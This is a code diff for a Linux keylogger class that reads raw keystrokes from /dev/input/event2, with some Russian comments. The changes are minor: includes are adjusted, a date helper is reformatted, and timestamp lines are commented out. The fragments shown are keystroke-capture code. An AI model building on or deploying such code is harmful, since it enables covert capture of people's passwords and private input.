@@ -1,8 +1,7 @@
 #define DEV_PATH "/dev/input/event2"
-#include <map>
+#include <vector>
 #include "key_logger.h"
 #include <iostream>
-#include <stdio.h>
 #include <linux/input.h>
 #include <stdlib.h>
 #include <sys/types.h>
@@ -12,14 +11,13 @@
 #include <iostream>
 #include <errno.h>
 #include <string.h>
+#include <string>
 
-#pragma region Вспомогательные функции
-  std::string CurrentDateTime()
-    {
-        std::string output = "Date:  ";
-        time_t seconds = time(nullptr);
-        tm* pTm = localtime(&seconds);
-        return output + asctime(pTm);
+ std::string CurrentDateTime() {
+    std::string output = "Date:  ";
+    time_t seconds = time(nullptr);
+    tm* pTm = localtime(&seconds);
+    return output + asctime(pTm);
     }
 int check(int result) {
     if (result >= 0)
@@ -37,7 +35,6 @@ bool isLetter(const int value)
     else
         return false;
 }
-#pragma endregion
 
 #pragma region Класс кей логгера
 Key_logger::Key_logger(){
@@ -179,7 +176,7 @@ Key_logger::Key_logger(){
    } 
    std::vector<std::string> Key_logger::get_keys_vector(std::string path){
         std::vector<std::string> names;
-        names.push_back(CurrentDateTime());
+        //names.push_back(CurrentDateTime());
         int keys_fd; //дескриптор
         struct input_event t;  
         struct input_event t_shift;
@@ -252,7 +249,7 @@ Key_logger::Key_logger(){
 
         }
         close(keys_fd);
-        names.push_back("\n"+ CurrentDateTime());
+        //names.push_back("\n"+ CurrentDateTime());
         return names;  
     }
 #pragma endregion
